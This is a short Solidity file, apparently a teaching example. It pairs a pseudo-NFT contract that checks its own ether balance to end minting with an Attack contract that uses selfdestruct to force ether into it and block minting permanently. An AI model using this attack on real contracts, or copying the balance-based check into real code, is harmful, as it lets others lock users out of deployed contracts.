//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// Pseudo NFT contract
contract NFT {
    uint public goal = 100 ether;
    uint public totalSupply;
    mapping(uint => address) public ownerOf;

    function mint() public payable {
        require(msg.value == 0.01 ether, "Must send exactly 0.01 Ether!");
        require(address(this).balance <= goal, "Minting is finished!");

        totalSupply ++;

        ownerOf[totalSupply] = msg.sender;
    }
}

contract Attack {
    NFT nft;

    constructor(NFT _nft) {
        nft = NFT(_nft);
    }

    function attack() public payable {
        address payable nftAddress = payable(address(nft));
        selfdestruct(nftAddress);
    }
}